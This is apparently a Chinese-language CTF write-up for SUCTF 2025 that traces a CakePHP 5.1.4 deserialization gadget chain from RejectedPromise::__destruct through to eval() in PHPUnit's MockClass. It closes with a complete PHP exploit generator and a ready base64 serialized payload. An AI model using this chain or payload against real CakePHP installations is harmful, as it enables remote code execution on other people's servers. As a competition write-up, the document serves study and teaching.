---
title: "SUCTF"
description: "SUCTF CakePHP 5.1.4 反序列化攻击链详细分析。"
publishDate: "2025-01-01T00:00:00+08:00"
ogImage: "https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/1505333f9f196b7aa77dcd18915873dd.png"
categories: ["CTF"]
tags: ["suctf", "php", "反序列化"]
---
## 攻击链概览

```plain text
RejectedPromise::__destruct() 
    ↓
Response::__toString() 
    ↓
Table::__call() 
    ↓
BehaviorRegistry::call() 
    ↓
MockClass::generate() 
    ↓
eval() - RCE
```



## 详细分析每个环节



### 1. 入口点 - 反序列化触发



**位置**: `src/PagesController.php:79`



```php
public function handleSer()
{
    $ser = $this->request->getQuery('ser');
    unserialize(base64_decode($ser));  // 直接反序列化用户输入
    // ...
}
```



**攻击方式**: `GET /ser?ser=<base64_encoded_payload>`



**关键点**:



* 没有任何输入验证

* 直接反序列化用户控制的Base64数据

* 这是整个攻击链的起点



### 2. 第一环 - RejectedPromise::\_\_destruct()



**文件**: `src/cakephp-5-1-4/vendor/react/promise/src/Internal/RejectedPromise.php`



**关键代码**:



```php
public function __destruct()
{
    if ($this->handled) {
        return;
    }

    $handler = set_rejection_handler(null);
    if ($handler === null) {
        $message = 'Unhandled promise rejection with ' . $this->reason;
        \error_log($message);
        return;
    }

    try {
        $handler($this->reason);  // 关键：调用handler函数
    } catch (\Throwable $e) {
        // 错误处理
    }
}
```



**攻击原理**:



1. 当RejectedPromise对象被销毁时，`__destruct()`方法被调用

2. 如果 `$this->handled`为false，会尝试获取rejection handler

3) 如果handler存在，会调用 `$handler($this->reason)`

4) 这里 `$this->reason`是可控的，可以设置为任意对象



**构造要点**:



* `$this->handled` 必须为 `false`

* `$this->reason` 设置为我们想要触发的对象

* 需要确保 `set_rejection_handler(null)`返回非null值



### 3. 第二环 - Response::\_\_toString()



**文件**: `src/cakephp-5-1-4/vendor/cakephp/cakephp/src/Http/Response.php`



**关键代码**:



```php
public function __toString(): string
{
    $this->stream->rewind();
    return $this->stream->getContents();
}
```



**攻击原理**:



1. 当Response对象被转换为字符串时，`__toString()`方法被调用

2. 调用 `$this->stream->rewind()`方法

3) 调用 `$this->stream->getContents()`方法

4) 如果 `$this->stream`是可控的对象，可以触发其方法



**构造要点**:



* 将Response对象设置为RejectedPromise的reason

* 设置 `$this->stream`为可控对象

* 确保该对象有 `rewind()`和 `getContents()`方法



### 4. 第三环 - Table::\_\_call()



**文件**: `src/cakephp-5-1-4/vendor/cakephp/cakephp/src/ORM/Table.php`



**关键代码**:



```php
public function __call(string $method, array $args): mixed
{
    if ($this->_behaviors->hasMethod($method)) {
        return $this->_behaviors->call($method, $args);
    }
    if (preg_match('/^find(?:\w+)?By/', $method) > 0) {
        return $this->_dynamicFinder($method, $args);
    }

    throw new BadMethodCallException(
        sprintf('Unknown method `%s` called on `%s`', $method, static::class),
    );
}
```



**攻击原理**:



1. 当调用Table对象上不存在的方法时，`__call()`方法被触发

2. 首先检查 `$this->_behaviors->hasMethod($method)`

3) 如果返回true，调用 `$this->_behaviors->call($method, $args)`

4) 这里 `$method`和 `$args`都是可控的



**构造要点**:



* 将Table对象设置为Response的stream

* 设置 `$this->_behaviors`为可控对象

* 确保该对象的 `hasMethod()`方法返回true

* 确保该对象的 `call()`方法可以被利用



### 5. 第四环 - BehaviorRegistry::call()



**文件**: `src/cakephp-5-1-4/vendor/cakephp/cakephp/src/ORM/BehaviorRegistry.php`



**关键代码**:



```php
public function call(string $method, array $args = []): mixed
{
    $method = strtolower($method);
    if ($this->hasMethod($method) && $this->has($this->_methodMap[$method][0])) {
        [$behavior, $callMethod] = $this->_methodMap[$method];
      
        return $this->_loaded[$behavior]->{$callMethod}(...$args);
    }

    throw new BadMethodCallException(
        sprintf('Cannot call `%s`, it does not belong to any attached behavior.', $method),
    );
}
```



**攻击原理**:



1. 将method转换为小写

2. 检查 `$this->hasMethod($method)`和 `$this->has($this->_methodMap[$method][0])`

3) 从 `$this->_methodMap[$method]`获取 `[$behavior, $callMethod]`

4) 调用 `$this->_loaded[$behavior]->{$callMethod}(...$args)`

5. 这里 `$behavior`、`$callMethod`和 `$args`都是可控的



**构造要点**:



* 设置 `$this->_methodMap`数组，键为method名，值为 `[behavior_name, call_method]`

* 设置 `$this->_loaded`数组，键为behavior\_name，值为目标对象

* 确保目标对象有对应的call\_method方法



### 6. 第五环 - MockClass::generate() - RCE



**文件**: `src/cakephp-5-1-4/vendor/phpunit/phpunit/src/Framework/MockObject/Generator/MockClass.php`



**关键代码**:



```php
public function generate(): string
{
    if (!class_exists($this->mockName, false)) {
        eval($this->classCode);  // 关键：直接执行PHP代码
      
        call_user_func(
            [
                $this->mockName,
                '__phpunit_initConfigurableMethods',
            ],
            ...$this->configurableMethods,
        );
    }

    return $this->mockName;
}
```



**攻击原理**:



1. 检查 `$this->mockName`类是否存在

2. 如果不存在，直接执行 `eval($this->classCode)`

3) 这里 `$this->classCode`是完全可控的PHP代码

4) 可以执行任意PHP代码，实现RCE



**构造要点**:



* 设置 `$this->mockName`为一个不存在的类名

* 设置 `$this->classCode`为恶意PHP代码

* 确保 `$this->configurableMethods`不会导致错误



## 完整攻击载荷构造



### 1. 构造MockClass对象



```php
$mockClass = new \PHPUnit\Framework\MockObject\Generator\MockClass(
    '<?php system("whoami"); ?>',  // classCode - 恶意PHP代码
    'NonExistentClass',            // mockName - 不存在的类名
    []                             // configurableMethods - 空数组
);
```



### 2. 构造BehaviorRegistry对象



```php
$behaviorRegistry = new \Cake\ORM\BehaviorRegistry();
$behaviorRegistry->_methodMap = ['test' => ['mock', 'generate']];
$behaviorRegistry->_loaded = ['mock' => $mockClass];
```



### 3. 构造Table对象



```php
$table = new \Cake\ORM\Table();
$table->_behaviors = $behaviorRegistry;
```



### 4. 构造Response对象



```php
$response = new \Cake\Http\Response();
$response->stream = $table;
```



### 5. 构造RejectedPromise对象



```php
$rejectedPromise = new \React\Promise\Internal\RejectedPromise($response);
```



### 6. 序列化并编码



```php
$serialized = serialize($rejectedPromise);
$encoded = base64_encode($serialized);
```



## 攻击流程总结



1. **反序列化触发**: 用户访问 `/ser?ser=<payload>`，触发 `unserialize()`

2. **对象销毁**: RejectedPromise对象被销毁，触发 `__destruct()`

3) **字符串转换**: 在 `__destruct()`中，Response对象被转换为字符串，触发 `__toString()`

4) **方法调用**: 在 `__toString()`中，调用Table对象的方法，触发 `__call()`

5. **行为调用**: 在 `__call()`中，调用BehaviorRegistry的 `call()`方法

6. **代码执行**: 在 `call()`中，调用MockClass的 `generate()`方法

7) **RCE**: 在 `generate()`中，执行 `eval($this->classCode)`，实现远程代码执行



## 关键技巧



### 1. 对象链构造



* 每个对象都包含下一个攻击目标

* 利用PHP的魔术方法自动触发



### 2. 参数控制



* 通过对象属性控制方法参数

* 利用数组索引控制方法调用



### 3. 条件绕过



* 确保每个条件检查都返回true

* 利用默认值和空数组绕过限制



### 4. 类加载



* 利用不存在的类名触发 `eval()`

* 避免类名冲突



## Questions

## 1. 为什么`$message = 'Unhandled promise rejection with ' . $this->reason;`这里要想到调用Response::\_\_toString



让我先查看RejectedPromise的\_\_destruct方法：



**详细解释**：



这里的关键在于第40行：`$message = 'Unhandled promise rejection with ' . $this->reason;`



当PHP执行字符串连接操作时，如果`$this->reason`是一个对象，PHP会自动调用该对象的`__toString()`方法将对象转换为字符串。



**具体过程**：

1. `$this->reason`被设置为一个Response对象

2. 当执行字符串连接`'Unhandled promise rejection with ' . $this->reason`时

3) PHP检测到`$this->reason`是对象，自动调用`Response::__toString()`

4) 这样就触发了Response对象的`__toString()`方法



**为什么选择Response对象**：

* Response类实现了`Stringable`接口，有`__toString()`方法

* 在`__toString()`中会调用`$this->stream`的方法

* 可以进一步控制调用链



## 2. 将Response对象设置为RejectedPromise的reason之后，怎么就能调用\_\_toString



让我查看Response类的\_\_toString方法：

**详细解释**：

当Response对象被转换为字符串时，PHP会自动调用`__toString()`方法。这个过程发生在：



1. **字符串连接时**：`'text' . $responseObject`

2. **echo输出时**：`echo $responseObject`

3) **字符串拼接时**：`sprintf('%s', $responseObject)`

4) **类型转换时**：`(string)$responseObject`



**在攻击链中的触发**：

```php
// 在RejectedPromise::__destruct()中
$message = 'Unhandled promise rejection with ' . $this->reason;
//                                                      ↑
//                                              这里触发__toString()
```

**Response::\_\_toString()的执行**：

```php
public function __toString(): string
{
    $this->stream->rewind();        // 调用stream对象的rewind方法
    return $this->stream->getContents();  // 调用stream对象的getContents方法
}
```

这里`$this->stream`被设置为Table对象，所以会调用Table对象的方法。

## 3. 当调用Table对象上不存在的方法时，`__call()`方法被触发，这句话怎么理解？



让我查看Table类的\_\_call方法：

**详细解释**：



在Response::\_\_toString()中，调用了`$this->stream->rewind()`和`$this->stream->getContents()`。



**具体过程**：

1. `$this->stream`被设置为Table对象

2. 调用`$this->stream->rewind()`，即`$table->rewind()`

3) Table类没有`rewind()`方法

4) PHP自动调用`Table::__call('rewind', [])`

5. 同样，调用`$this->stream->getContents()`，即`$table->getContents()`

6. Table类没有`getContents()`方法

7) PHP自动调用`Table::__call('getContents', [])`



**\_\_call()的触发条件**：

* 当调用对象上不存在的方法时

* PHP会自动调用该对象的`__call()`方法

* 传入参数：方法名和参数数组



**在攻击链中**：

* 方法名：`'rewind'`或`'getContents'`

* 参数：`[]`（空数组）

* 这些方法在Table类中都不存在，所以触发`__call()`



## 4. 为什么调用完Table::\_\_call()之后还要去调用BehaviorRegistry::call()



让我查看Table::\_\_call()的具体实现：



**详细解释**：



在Table::\_\_call()中：

```php
public function __call(string $method, array $args): mixed
{
    if ($this->_behaviors->hasMethod($method)) {  // 检查behaviors是否有这个方法
        return $this->_behaviors->call($method, $args);  // 调用behaviors的call方法
    }
    // ...
}
```



**调用流程**：

1. `$table->rewind()`触发`Table::__call('rewind', [])`

2. 检查`$this->_behaviors->hasMethod('rewind')`

3) 如果返回true，调用`$this->_behaviors->call('rewind', [])`

4) `$this->_behaviors`是BehaviorRegistry对象

5. 所以会调用`BehaviorRegistry::call('rewind', [])`



**为什么需要BehaviorRegistry**：

* Table类本身没有`rewind()`方法

* 但Table类支持通过behaviors扩展功能

* `__call()`方法会检查behaviors是否有对应的方法

* 如果有，就委托给behaviors处理



**攻击者的控制**：

* 可以控制`$this->_behaviors`为任意对象

* 可以控制`hasMethod()`的返回值

* 可以控制`call()`方法的执行



## 5. MockClass::generate()和前面的链是什么关系，为什么不直接调用它



让我查看BehaviorRegistry::call()的实现：



**详细解释**：



**为什么不能直接调用MockClass::generate()**：



1. **访问限制**：MockClass::generate()不是公开的API，不能直接调用

2. **参数要求**：需要正确的参数和对象状态

3) **权限控制**：可能有权限检查



**通过攻击链调用的优势**：



1. **绕过限制**：通过正常的对象方法调用链

2. **参数控制**：可以控制传入的参数

3) **隐蔽性**：看起来像正常的框架调用



**在BehaviorRegistry::call()中的关键代码**：

```php
public function call(string $method, array $args = []): mixed
{
    $method = strtolower($method);
    if ($this->hasMethod($method) && $this->has($this->_methodMap[$method][0])) {
        [$behavior, $callMethod] = $this->_methodMap[$method];  // 从映射表获取行为和方法名
        
        return $this->_loaded[$behavior]->{$callMethod}(...$args);  // 调用对应的方法
    }
}
```



**攻击者的控制**：

* `$this->_methodMap['rewind'] = ['mock', 'generate']`

* `$this->_loaded['mock'] = $mockClassObject`

* 当调用`rewind`时，实际调用`$mockClassObject->generate()`



**完整的调用链**：

```plain text
Table::__call('rewind', [])
    ↓
BehaviorRegistry::call('rewind', [])
    ↓
$this->_methodMap['rewind'] = ['mock', 'generate']
    ↓
$this->_loaded['mock']->generate()
    ↓
MockClass::generate()
    ↓
eval($this->classCode)
```



**为什么不直接调用**：

1. **框架设计**：这是框架的正常调用机制

2. **参数传递**：通过框架传递参数更安全

3) **错误处理**：框架会处理各种异常情况

4) **隐蔽性**：看起来像正常的业务逻辑调用



## 总结



这个攻击链的精妙之处在于：



1. **利用PHP的魔术方法**：`__destruct()`, `__toString()`, `__call()`

2. **利用框架的设计模式**：行为模式、委托模式

3) **利用字符串操作**：自动触发`__toString()`

4) **利用方法委托**：通过`__call()`委托给其他对象

5. **利用映射机制**：通过映射表控制方法调用



每个环节都是必要的，缺少任何一个环节都无法完成攻击。这就是为什么这个攻击链如此精妙和难以发现的原因。

Exp

```java
<?php

namespace React\Promise\Internal;
use Cake\Http\Response;

final class RejectedPromise{
    private $reason ;
    private $handled = false;
    public function __construct()
    {
        $this->reason = new Response();
    }
}
namespace Cake\Http;
use Cake\ORM\Table;

class Response {
    private $stream;
    public function __construct(){
        $this->stream = new Table();
    }
}

//public function __toString(): string
//{
//    $this->stream->rewind();
//
//    return $this->stream->getContents();
//}
namespace Cake\ORM;
use PHPUnit\Framework\MockObject\Generator\MockClass;
class Table {
    protected BehaviorRegistry $_behaviors;
    public function __construct(){
        $this->_behaviors = new BehaviorRegistry();
    }

}
class ObjectRegistry{}
class BehaviorRegistry extends ObjectRegistry{
    protected array $_methodMap;
    protected array $_loaded = [];
    public function __construct(){
        $this->_methodMap = ['rewind' => array('aaa', 'generate')];
        $this->_loaded = ['aaa' => new MockClass()];
    }
}
namespace PHPUnit\Framework\MockObject\Generator;

use function call_user_func;
use function class_exists;

final class MockClass{
    private readonly string $classCode;
    private readonly string $mockName ;
    public function __construct(){
        $this->mockName = 'aaa';
        $this->classCode = 'phpinfo();';
    }

}

namespace React\Promise\Internal;
$a = new RejectedPromise();
echo 11111;
echo base64_encode(serialize($a));
?>

```

```plain text
TzozODoiUmVhY3RcUHJvbWlzZVxJbnRlcm5hbFxSZWplY3RlZFByb21pc2UiOjI6e3M6NDY6IgBSZWFjdFxQcm9taXNlXEludGVybmFsXFJlamVjdGVkUHJvbWlzZQByZWFzb24iO086MTg6IkNha2VcSHR0cFxSZXNwb25zZSI6MTp7czoyNjoiAENha2VcSHR0cFxSZXNwb25zZQBzdHJlYW0iO086MTQ6IkNha2VcT1JNXFRhYmxlIjoxOntzOjEzOiIAKgBfYmVoYXZpb3JzIjtPOjI1OiJDYWtlXE9STVxCZWhhdmlvclJlZ2lzdHJ5IjoyOntzOjEzOiIAKgBfbWV0aG9kTWFwIjthOjE6e3M6NjoicmV3aW5kIjthOjI6e2k6MDtzOjM6ImFhYSI7aToxO3M6ODoiZ2VuZXJhdGUiO319czoxMDoiACoAX2xvYWRlZCI7YToxOntzOjM6ImFhYSI7Tzo0ODoiUEhQVW5pdFxGcmFtZXdvcmtcTW9ja09iamVjdFxHZW5lcmF0b3JcTW9ja0NsYXNzIjoyOntzOjU5OiIAUEhQVW5pdFxGcmFtZXdvcmtcTW9ja09iamVjdFxHZW5lcmF0b3JcTW9ja0NsYXNzAGNsYXNzQ29kZSI7czoxMDoicGhwaW5mbygpOyI7czo1ODoiAFBIUFVuaXRcRnJhbWV3b3JrXE1vY2tPYmplY3RcR2VuZXJhdG9yXE1vY2tDbGFzcwBtb2NrTmFtZSI7czozOiJhYWEiO319fX19czo0NzoiAFJlYWN0XFByb21pc2VcSW50ZXJuYWxcUmVqZWN0ZWRQcm9taXNlAGhhbmRsZWQiO2I6MDt9
```

## Reference&#x20;

https://infernity.top/2025/01/14/SUCTF2025/

https://blog.s1um4i.com/2025-SUCTF/

https://github.com/team-su/SUCTF-2025/tree/master/web/SU\_POP/writeuphttps://blog.0xfff.team/posts/suctf\_2025\_writeup/#su\_pop

https://xz.aliyun.com/news/9446#toc-7

